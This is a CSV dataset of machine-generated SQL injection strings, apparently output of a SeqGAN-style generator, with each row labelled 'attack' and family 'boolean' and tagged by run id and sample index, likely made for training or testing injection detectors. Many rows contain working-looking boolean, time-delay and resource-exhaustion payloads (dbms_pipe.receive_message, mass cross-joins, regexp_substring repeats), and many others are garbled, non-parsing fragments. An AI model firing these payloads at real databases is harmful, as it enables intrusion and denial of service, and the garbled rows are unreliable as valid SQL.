label,payload,family,payload_type,method,run_id,sample_index
attack,"1%     ""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,218
attack,"-7731m""  =  """"   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""44621%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,219
attack,"$' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '8327\=  3880  =    1087 2724h=  selectdd",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,220
attack,"-' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and '4906`n14165rm'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,221
attack,z%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,222
attack,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'h'  =  'r""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,223
attack,"1'||  (  select '   '  )   as juxt where 5956  =  5956 and 8148  =  like  (  'mbc,Uuoppt  2774  5485(  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,224
attack,-7770'   where 1  755569  =  3455 char  (  =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,225
attack,"-%%""  convert  =  2027   )     --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,226
attack,"-118h"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%'  =  '""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,227
attack,"-9462""  =  ""hdxmup",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,228
attack,"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""y' where 4912  =  4912 or 6979  =  like  (  'h  =(  =    (  ==  117",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,229
attack,1selecth$cjkby,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,230
attack,"1""or 4799  =  121   > 4018  =  7555",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,231
attack,"-8673'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ' wherefghg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,232
attack,"-b' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ''ucwhere 107  =' where 4912  =  4912 or 6979  =  like  (  ' 3455  *  =  select",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,233
attack,"1"" 1570  select cchar 2oe  =  =  selectd",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,234
attack,"-4'  )   and 8148  =  like  (  'r%'  =  'r""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,235
attack,select r f  selectfz,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,236
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'r'  )   or   (  2301  =  7504  )  *7504 and   (  '""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,237
attack,-1014873'+  (  select 'wcdcdsdefgyu' like 'r,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,238
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '=%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '5485",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,239
attack,"-21748004b'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'xqon",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,240
attack,1'where 3455  (  121  =  4018   =  5485 where,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,241
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'tg""  (  (  =  )      == |  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,242
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'os",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,243
attack,"1%'  =  'ababcdounl=f  afg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,244
attack,"1'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +''  )   as juxt where 5956  =  5956 and 8148  =  like  (  ''  =  'N2180r""  =  ""  h'lscrdr""  =  ""un",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,245
attack,"1%""   or   ==",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,246
attack,1zwnwccefyL,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,247
attack,1%   n,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,248
attack,1'rb'  =  '    ((  (  =   =  =,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,249
attack,"1"" and  =l(  (  =  =  =  121 3393",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,250
attack,"1""%'    a ,v' like 'g'h'  =  ' 3038x where ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,251
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,252
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""m'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,253
attack,"-""dskh""c where o  select r4018  =  '  )   and 8148  =  like  (  ' or 6179",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,254
attack,"-8919""  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,255
attack,"1""  ),/*""  =  ""nwuxdumiaandubc",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,256
attack,"-4873%' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""  '   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,257
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,258
attack,-4873'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,259
attack,1'   )       (  h  =   (  ==  1570  107,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,260
attack,1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  '2180 where 3352=  =       2774   w and  ==,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,261
attack,' in boolean mode  )   or 6979  =  like  (  'w'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,262
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ')     where f  =    (  =)    (  4018  3880",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,263
attack,1   )        a 1570  2774 u 9575=%6671  =  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,264
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '   c    =   )     and 2180  (  =  =(  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,265
attack,1   adc c  2027=  =  3455  =  2774 where,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,266
attack,1%',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,267
attack,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'kbf1""  =  "" ' like 'prchar  =  =  7522 4799",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,268
attack,-8919%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,269
attack,-9133@abcdede where  =_c o 4799,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,270
attack,"',1617t'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '  121  8459  107or or 3862  = 4018",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,271
attack,-7770'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'pjexei f3862  107efgtz(,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,272
attack,"-4462w'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,273
attack,1' in boolean mode  )   or 6979  =  like  (  '%kd,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,274
attack,"gq""  =  ""gcqe_119",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,275
attack,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ''  =  'r'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,276
attack,"-4873%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%""  =  ""||3352g',' or 'select xdi'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,277
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,278
attack,"-8919""     aodnsbcchdcfy  =",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,279
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'h)   (  ='   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '  =2027*  8459  select ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,280
attack,"-1772"" i   3393 1668  =  ((  =  s and",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,281
attack,"-8327"" char    6093  select where 3880  =    (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,282
attack,"-%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%was",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,283
attack,"""   an%s",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,284
attack,"1' in boolean mode  )   or 6979  =  like  (  ')"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,285
attack,1'+  (  select 'wd   where c  =  =)   (  =  =/,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,286
attack,"-6388' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'yyy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,287
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'yip",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,288
attack,1'+  (  select 'cdupgz unyr  (  =  =  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,289
attack,"1'+  (  select ''   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'das cfg',up   proeq",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,290
attack,-%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,291
attack,g'or 2us where 7417*  1087 7555*jnl,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,292
attack,"-4018nnlq_i""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,293
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""ef-6588dxb-'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,294
attack,"--8919'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'/",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,295
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ''  )   as juxt where 5956  =  5956 and 8148  =  like  (  'cand  107    (  =(  =  )   ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,296
attack,1'   )    )     or j  7555 c 3455where cf,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,297
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '   (  (  1087 3862  =  select where or 2724",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,298
attack,1'  )   and 8148  =  like  (  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,299
attack,-4462-2583'' ec where char  =  121  119%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,300
attack,1'  )   and 8148  =  like  (  'a where 79  =--8571  =--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,301
attack," ,y121'  =  'r' or 8384  =  like  (  ' where deqqcee_5485",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,302
attack,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""wbczcedeclrfg'  )   as juxt where 5956  =  5956 and 8148  =  like  (  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,303
attack,"'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ' cd where 6849'||  (  select '=  select con   where 3862",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,304
attack,-111Lselectucdch(   =char  2774  =    ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,305
attack,"11""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  """" 2027 efy  =  1570  =  =select ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,306
attack,-9148 r(xu   where =ddf,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V5__sql_aware__len20__gpre60__reward_on__seed88,307
